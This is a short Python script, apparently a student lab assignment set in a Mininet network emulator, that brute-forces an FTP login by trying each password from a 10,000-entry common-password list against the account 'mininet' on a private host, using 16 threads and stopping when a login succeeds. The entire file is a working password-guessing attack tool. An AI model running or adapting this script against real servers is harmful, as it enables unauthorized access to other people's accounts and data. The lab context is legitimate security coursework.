"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

Brute-forcing FTP
"""

import sys
import os
import time
import ftplib
import concurrent.futures


def ftp_login(host, username, password):
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(username, password)
            print(f"Found Password : {password} for account : {username}")
            return True
    except:
        pass


if __name__ == '__main__':
    host = "10.12.0.40"
    username = "mininet"
    wordlist = "10k-most-common.txt"

    if not os.path.exists(wordlist):
        print("\nPlease move the file '10k-most-common.txt' into the correct directory")
        sys.exit(1)

    print(
        f'Starting threaded FTP bruteforce on {host} with account : {username}')
    start_time = time.time()

    with open(wordlist, 'r') as f:
        passwords = f.readlines()

        with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
            futures = []
            for password in passwords:
                print(password.strip())
                futures.append(executor.submit(
                    ftp_login, host, username, password.strip()))

            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    executor.shutdown(wait=False)
                    print('Time taken :', time.time() - start_time)
                    sys.exit(0)

    print('Password Not Found')
    print('Time taken :', time.time() - start_time)
